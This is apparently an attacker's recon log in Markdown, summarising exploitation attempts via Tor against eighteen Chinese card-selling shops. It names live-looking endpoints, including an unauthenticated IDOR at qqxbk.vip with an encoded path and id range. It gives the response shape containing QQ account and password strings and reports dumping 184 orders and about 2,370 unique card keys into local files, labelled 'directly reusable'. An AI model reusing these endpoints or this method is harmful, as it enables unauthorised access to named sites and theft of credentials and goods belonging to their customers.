# SUCCESS_CASES → batch18 (18 rainbow shops)

Source: `/data/recon/exports/SUCCESS_CASES.md` (tested upfront via Tor)

| Case | Method | Batch result |
|------|--------|--------------|
| **qd93.com** | `/?mod=query&data=` | 抽样无 `showOrder`/`mod=faka` |
| **Rainbow ajax dump** | `ajax.php?act=query` | **16/18 → HTTP 500**；`qq857.cc` / `qqxbk.vip` → `data=[]` |
| **79yj / qq1234** | `%61pi.php?act=search&id=` | **17/18 auth**；**`qqxbk.vip` OPEN → 184/184 全量卡密** |
| **tools apikey** | `%61pi.php?act=tools&key=` | oracle 存活；短喷雾 0 hit |
| **mima1314 / 15118** | YKFAKA null | **N/A**（全彩虹） |

## Directly reusable

- **79yj api-search IDOR → `https://qqxbk.vip/`**
  - Endpoint: `https://qqxbk.vip/%61pi.php?act=search&id={1..184}`
  - Auth: none
  - Payload shape: `{"code":0,"message":"success","type":"4","status":"1","data":{"订单结果":"QQ----pass----…"}}`
  - Stats: 184 orders, 2381 kami lines, 2370 unique
  - Files: `dump/qqxbk_cards.json`, `dump/qqxbk_kami.tsv`, `dump/qqxbk_kami_unique.txt`

**kami_obtained: true (qqxbk.vip only).**
